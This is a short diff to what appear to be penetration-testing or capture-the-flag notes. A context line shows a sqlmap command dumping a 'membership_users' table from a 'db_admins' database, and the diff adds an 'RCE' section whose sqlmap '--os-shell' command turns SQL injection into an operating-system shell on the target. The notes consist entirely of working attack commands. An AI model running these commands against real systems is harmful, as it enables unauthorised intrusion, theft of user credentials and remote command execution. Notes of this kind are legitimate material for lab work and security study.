@@ -28,3 +28,9 @@ Dumped Table
 ```
 sqlmap -r sql.req --batch -D db_admins -T membership_users --dump
 ```
+
+RCE
+
+```
+sqlmap -r sql.req --os-shell --batch
+```
